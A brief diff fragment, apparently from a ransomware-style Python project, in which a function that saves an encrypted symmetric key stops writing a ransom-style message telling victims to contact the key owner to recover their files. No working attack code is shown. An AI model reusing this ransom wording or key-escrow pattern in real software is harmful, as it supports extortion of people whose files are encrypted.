@@ -75,8 +75,6 @@ def save_encrypted_key(file, sym_key):
         )
     )
     with open(file, 'w') as f:
-        f.write('This key has been encrypted and only recoverable by the owner.\n')
-        f.write('Contact them about the acces to the key and your files will be saved.\n\n')
         f.write(cipher.hex())
 
 
